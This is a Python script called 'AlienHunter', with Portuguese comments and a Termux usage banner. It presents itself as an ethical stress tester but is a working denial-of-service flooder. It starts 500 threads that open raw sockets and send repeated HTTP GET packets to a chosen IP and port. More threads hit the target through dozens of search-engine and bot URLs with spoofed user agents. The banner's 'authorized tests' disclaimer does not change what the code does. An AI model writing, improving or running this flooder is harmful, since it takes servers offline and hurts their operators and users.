#!/usr/bin/python3
# -*- coding: utf-8 -*-

import sys
import time
import socket
import random
import logging
import threading
import urllib.request
from queue import Queue
from optparse import OptionParser

#Os Users Agents simulam os navegadores reais, adicionei vários 
def user_agent():
    global uagent
    uagent = []
    uagent.append("Mozilla/5.0 (iPhone; U; CPU iPhone OS) (compatible; Googlebot-Mobile/2.1; http://www.google.com/bot.html)")
    uagent.append("Mozilla/5.0 (compatible; YandexImages/3.0; +http://yandex.com/bots)")
    uagent.append("Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0")
    uagent.append("mozilla/5.0 (Windows NT 10.0; Win64; x64) Applewebkit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36")
    uagent.append("Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36")
    uagent.append("Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 OPR/85.0.4341.72")
    uagent.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5026.0 Safari/537.36 Edg/103.0.1254.0")
    uagent.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36 Edg/101.0.1210.32")
    uagent.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15")
    uagent.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 11_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1 Safari/605.1.15")
    uagent.append("Mozilla/5.0 (X11; Linux i686; rv:97.0) Gecko/20100101 Firefox/97.0")
    uagent.append("Mozilla/5.0 (X11; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0")
    uagent.append("Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:98.0) Gecko/20100101 Firefox/98.0")
    uagent.append("Mozilla/5.0 (Android 12; Mobile; rv:97.0) Gecko/97.0 Firefox/97.0")
    uagent.append("Mozilla/5.0 (X11; FreeBSD amd64; rv:87.0) Gecko/20100101 Firefox/87.0")
    uagent.append("Mozilla/5.0 (X11; Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36")
    uagent.append("Mozilla/5.0 (X11; CrOS aarch64 14526.89.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.133 Safari/537.36")
    uagent.append("Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36 Edg/101.0.1210.39")
    uagent.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36")
    uagent.append("Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:96.0) Gecko/20100101 Firefox/96.0")
    uagent.append("Mozilla/5.0 (X11; Linux x86_64; rv:99.0) Gecko/20100101 Firefox/99.0")
    uagent.append("Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0")
    uagent.append("Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.7113.93 Safari/537.36")
    uagent.append("Googlebot-Image/1.0")
    return uagent

#listas dos bots conhecidos na web, para simular os acessos 
def my_bots():
    global bots
    bots = []
    bots.append("http://yandex.com/bots")
    bots.append("https://ahrefs.com/robot")
    bots.append("https://www.qwant.com/?q=")
    bots.append("https://www.ask.com/web?q=")
    bots.append("https://www.baidu.com/s?wd=")
    bots.append("https://api.slack.com/robots")
    bots.append("https://www.semrush.com/bot/")
    bots.append("https://www.info.com/serp?q=")
    bots.append("https://www.aol.com/search?q=")
    bots.append("https://www.search.com/web?q=")
    bots.append("https://www.naver.com/search?q=")
    bots.append("https://www.teoma.com/search?q=")
    bots.append("http://www.bing.com/bingbot.htm")
    bots.append("https://www.lycos.com/search?q=")
    bots.append("https://www.hotbot.com/search?q=")
    bots.append("https://www.mojeek.com/search?q=")
    bots.append("https://www.sogou.com/web?query=")
    bots.append("https://www.google.com/search?q=")
    bots.append("https://www.ecosia.org/search?q=")
    bots.append("https://www.seznam.cz/hledani?q=")
    bots.append("https://www.sputnik.ru/search?q=")
    bots.append("https://www.excite.com/search?q=")
    bots.append("https://www.entireweb.com/web?q=")
    bots.append("https://www.webcrawler.com/serp?q=")
    bots.append("http://validator.w3.org/check?uri=")
    bots.append("https://search.yahoo.com/search?p=")
    bots.append("https://www.webfetch.com/search?q=")
    bots.append("https://www.alltheweb.com/search?q=")
    bots.append("https://www.looksmart.com/search?q=")
    bots.append("https://www.yippy.com/search?query=")
    bots.append("https://www.gigablast.com/search?q=")
    bots.append("https://www.searchalot.com/search?q=")
    bots.append("https://www.yandex.com/search/?text=")
    bots.append("https://www.dogpile.com/search/web?q=")
    bots.append("https://www.mywebsearch.com/search?q=")
    bots.append("https://www.wolframalpha.com/input/?i=")
    bots.append("http://duckduckgo.com/duckduckbot.html")
    bots.append("https://www.gibiru.com/results.html?q=")
    bots.append("https://www.searchencrypt.com/search?q=")
    bots.append("https://www.startpage.com/do/search?query=")
    bots.append("http://www.facebook.com/sharer/sharer.php?u=")
    bots.append("https://www.exalead.com/search/web/results/?q=")
    bots.append("https://www.metager.de/meta/meta.ger3?eingabe=")
    bots.append("https://help.pinterest.com/en/business/article/pinterest-crawler")
    
    return bots

def bot_testing_System(url):
    #criei essa lista para exibir caracteres/símbolos aleatoriamente
    #as espaçonaves representam o teste de Stress no servidor
    frases_testing =[
        "▁▂▃▄⨹▄▃▂▁                                ",                  
        "    ▁▂▃▄⨹▄▃▂▁                            ",
        "         ▁▂▃▄⨹▄▃▂▁                       ",
        "              ▁▂▃▄⨹▄▃▂▁                  ",
        "                   ▁▂▃▄⨹▄▃▂▁             ",
        "                        ▁▂▃▄⨹▄▃▂▁        ",
        "                             ▁▂▃▄⨹▄▃▂▁   ",
        "                                ▁▂▃▄⨹▄▃▂▁",
        "⦿─◈─⦿                                    ",
        "     ⦿─◈─⦿                               ",
        "         ⦿─◈─⦿                           ",
        "             ⦿─◈─⦿                       ",
        "                 ⦿─◈─⦿                   ",
        "                     ⦿─◈─⦿               ",
        "                         ⦿─◈─⦿           ",
        "                             ⦿─◈─⦿       ",
        "                                 ⦿─◈─⦿   ",
        "                                    ⦿─◈─⦿",
        " ꧁꧂                                         ",
        "        ꧁꧂                                  ",       
        "                                                ",
        "              ꧁꧂                            ",
        "                     ꧁꧂                     ",
        "                            ꧁꧂              ",
        "                                   ꧁꧂       ",
        "                                          ꧁꧂",
        " ⇫                                                ",
        "     ⇫                                            ",
        "         ⇫                                        ",
        "             ⇫                                    ",
        "                 ⇫                                ",
        "                     ⇫                            ",
        "                         ⇫                        ",
        "                             ⇫                    ",
        "                                 ⇫                ",
        "                                     ⇫            ",
        "                                         ⇫        ",
        "                                             ⇫    ",   
        " ✶                                                ",
        "    ✶                                             ",
        "       ✶                                          ",
        "          ✶                                       ",
        "             ✶                                    ",
        "                ✶                                 ",
        "                   ✶                              ",
        "                      ✶                           ",
        "                         ✶                        ",
        "                            ✶                     ",
        "                               ✶                  ",
        "                                  ✶               ",
        "                                     ✶            ",
        "                                        ✶         ",
        "                                           ✶      ",
        "                                              ✶   ",
        "                                                 ✶",
        " ✶                                                ",
        "    ✶                                             ",
        "       ✶                                          ",
        "          ✶                                       ",
        "             ✶                                    ",
        "                ✶                                 ",
        "                   ✶                              ",
        "                      ✶                           ",
        "                         ✶                        ",
        "                            ✶                     ",
        "                               ✶                  ",
        "                                  ✶               ",
        "                                     ✶            ",
        "                                        ✶         ",
        "                                           ✶      ",
        "                                              ✶   ",
        "                                                 ✶",
        "▵✶✶✶╱╲✶✶✶▵                                       ", 
        "      ▵✶✶✶╱╲✶✶✶▵                                 ",
        "            ▵✶✶✶╱╲✶✶✶▵                           ", 
        "                  ▵✶✶✶╱╲✶✶✶▵                     ",
        "                        ▵✶✶✶╱╲✶✶✶▵               ", 
        "                              ▵✶✶✶╱╲✶✶✶▵         ",
        "                                    ▵✶✶✶╱╲✶✶✶▵   ", 
        "                                       ▵✶✶✶╱╲✶✶✶▵", 
        " ▁▄⨹▄▁                                           ",
        "     ▁▄⨹▄▁                                       ",
        "          ▁▄⨹▄▁                                  ",
        "               ▁▄⨹▄▁                             ",
        "                    ▁▄⨹▄▁                        ",
        "                         ▁▄⨹▄▁                   ",
        "                              ▁▄⨹▄▁              ",
        "                                   ▁▄⨹▄▁         ",
        "                                        ▁▄⨹▄▁    ",
        "                                            ▁▄⨹▄▁",
        "◢╱╲◣                                             ",
        "   ◢╱╲◣                                          ",
        "      ◢╱╲◣                                       ",
        "         ◢╱╲◣                                    ",
        "            ◢╱╲◣                                 ",
        "               ◢╱╲◣                              ",
        "                  ◢╱╲◣                           ",
        "                     ◢╱╲◣                        ",
        "                        ◢╱╲◣                     ",
        "                           ◢╱╲◣                  ",
        "                              ◢╱╲◣               ",
        "                                 ◢╱╲◣            ",
        "                                    ◢╱╲◣         ",
        "                                       ◢╱╲◣      ",
        "                                          ◢╱╲◣   ",
        "                                             ◢╱╲◣", 
         
    ] 
    

    try:
        while True:
            req = urllib.request.urlopen(urllib.request.Request(url, headers={'User-Agent': random.choice(uagent)}))
            #aqui seleciona uma frase aleatória da lista
            frase_aleatoria = random.choice(frases_testing)
            #exibe em verde (código \033[92m)
            print(f"\033[92m{frase_aleatoria}...\033[0m")
            time.sleep(.1)
    except Exception as e:
        #aqui mostrará a mensagem de erro, em vermelho 
        print(f"\033[91mErro: {e}\033[0m")
        time.sleep(.1)

def down_it(item):
    frases = [
        "Preparando o teste de Loading",
        "CARREGANDO alguns PACOTES",
        "INICIANDO SEQUÊNCIA, Down test the Server",
        "TESTANDO REQUISIÇÕES",
        "SISTEMA EM EXECUÇÃO",
        "TESTANDE DE VULNERABILIDADE EM PROGRESSO",
        "O Código está em execução estável",
        "Aguarde um momento para os Envios",
        "Operação em andamento, aguarde por favor",
        "Beggining test, Please",
        "executando_teste() # Iniciando requesições...",
        "if firewall_bypass: acesso_concedido()",
        "for pacote in range(1000): enviar(pacote)",
        "try: acesso_root() except: print('Permissão negada')",
        "import sistema; sistema.comprometer()",
        "while not detectado: stealth_mode()",
        "def test(): return 'Sucesso!'",
        "print('Conexão estabelecida com alvo!')",
        "dados = extrair_vulnerabilidades(alvo)",

    ]
    try:
        while True:
            packet = str("GET / HTTP/1.1\nHost: " + host + "\n\n User-Agent: " + random.choice(uagent) + "\n" + data).encode('utf-8')
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, int(port)))
            if s.sendto(packet, (host, int(port))):
                s.shutdown(1)
                print("\033[92m", time.ctime(time.time()), "\033[0m \033[94m" + random.choice(frases) + "\033[0m")
            else:
                s.shutdown(1)
                print("\033[91mshut<->down\033[0m")
            time.sleep(.1)
    except socket.error as e:
        print("\033[91m⚠️POSSÍVEL FALHA, VERIFIQUE O SERVIDOR⚠️\033[0m")
        time.sleep(.2)
# ...existing code...

def dos():
    while True:
        item = q.get()
        down_it(item)
        q.task_done()

def dos2():
    while True:
        item = w.get()
        bot_testing_System(random.choice(bots) + "http://" + host)
        w.task_done()

def print_slow(str):
    for letter in str:
        sys.stdout.write(letter)
        sys.stdout.flush()
        time.sleep(0.003)  #Aqui é a velocidade da animação
    print()

def usage():
    banner = r"""

+-------------------------------------+

     ⟢  _____
     |     | |
    / \    | |
   |--o|===|-|
   |---|   |d|
  /     \  |w|
 | U     | |b|
 | S     |=| |
 | A     | | |
 |       | | |
 |       | | |
 |       | | |
 |       | | |
 |       | | |
 |       | | |
 |_______| |_|
|⟢⟣|   |⟢⟣|||
___________|_|_
|    _    _     ___ _____ _   _ ⟢⟢⟣  |
|   / \  | |   |_ _| ____| \ | |      |
|  / _ \ | |    | ||  _| |  \| |      |
| / ___ \| |___ | || |___| |\  |      |
|/_/  _\_\_____|___|_____|_|_\_|____  |
|| | | | | | | \ | |_   _| ____|  _ \ |
|| |_| | | | |  \| | | | |  _| | |_) ||
||  _  | |_| | |\  | | | | |___|  _ < |
||_| |_|\___/|_| \_| |_| |_____|_| \_\|
+-------------------------------------+
    
    AlienHunter - Ultimate Ethical Stress Testing v1.0
    (By Rennan Azevedo) 

    🛡️ Projeto acadêmico de segurança ofensiva 🛡️
    
    Este Script é para testes autorizados e fins educacionais
    O I.P de origem é visível, mesmo com VPN
    
    Uso:
    
    Coloque o readers.txt e o alienhunter.py soltos 
    no armazenamento interno do celular 

    no Termux:
    
    pkg install python: para instalar o python

    cd /storage/emulated/0/ para acessar o armazenamento interno

    python alienhunter.py -s (IP) -p PORTA 

    resumo:
    
    -s = IP do servidor alvo de teste
    -p = usar determinada porta 
    caso usar a porta padrão 80, não precisa de -p

    PAUSA: CTRL + C
    """

    print_slow(banner)
    sys.exit()

def get_parameters():
    global host, port, thr
    optp = OptionParser(add_help_option=False, epilog="Hacking")
    optp.add_option("-q", "--quiet", help="set logging to ERROR", action="store_const", dest="loglevel", const=logging.ERROR, default=logging.INFO)
    optp.add_option("-s", "--server", dest="host", help="IP do servidor alvo (ex: -s 192.168.1.1)")
    optp.add_option("-p", "--port", type="int", dest="port", help="Porta (padrão: 80)")
    optp.add_option("-h", "--help", dest="help", action='store_true', help="Mostra esta mensagem")
    opts, args = optp.parse_args()
    
    logging.basicConfig(level=opts.loglevel, format='%(levelname)-8s %(message)s')
    if opts.help:
        usage()
    if opts.host is not None:
        host = opts.host
    else:
        usage()
    port = opts.port if opts.port else 80
    thr = 500  #coloquei 500 o número fixo de threads

#lê os headers do arquivo headers.txt junto com o arquivo alienhunter.py
global data
headers = open("headers.txt", "r")
data = headers.read()
headers.close()

#filas para as threads
q = Queue()
w = Queue()

if __name__ == '__main__':
    if len(sys.argv) < 2:
        usage()
    get_parameters()
    print("\033[92mAlvo:", host, "Porta:", str(port), "Threads:", str(thr), "\033[0m")
    print("\033[94mIniciando...\033[0m")
    user_agent()
    my_bots()
    time.sleep(5)
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, int(port)))
        s.settimeout(1)
    except socket.error as e: #mostra quando falhar a conexão lá no servidor 
        print("\033[91mErro: Verifique o IP/porta do servidor\033[0m")
        usage()
    
    #esta parte inicia as threads
    for i in range(thr):
        t = threading.Thread(target=dos)
        t.daemon = True
        t.start()
        t2 = threading.Thread(target=dos2)
        t2.daemon = True
        t2.start()
    
    start = time.time()
    item = 0
    while True:
        if item > 1800: #Previne estouro de memória
            item = 0
            time.sleep(.1)
        item += 1
        q.put(item)
        w.put(item)
    q.join()
    w.join()